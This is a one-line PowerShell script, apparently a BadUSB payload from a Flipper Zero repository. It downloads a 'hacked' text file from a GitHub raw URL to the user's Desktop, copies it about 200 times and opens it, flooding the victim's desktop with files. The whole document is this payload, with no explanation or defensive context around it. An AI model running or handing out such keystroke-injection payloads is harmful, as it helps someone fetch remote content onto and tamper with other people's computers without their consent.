$DesktopPath = [Environment]::GetFolderPath("Desktop"); Invoke-WebRequest -Uri https://raw.githubusercontent.com/SeenKid/flipper-zero-bad-usb/main/utils/files/hacked.txt -OutFile $DesktopPath/H4ck3D.txt; while($ac -lt 200) { Copy-Item "$DesktopPath/H4ck3D.txt" -Destination "$DesktopPath/hacked$ac.txt"; $ac++};Start-Process -FilePath "$DesktopPath/H4ck3D.txt" 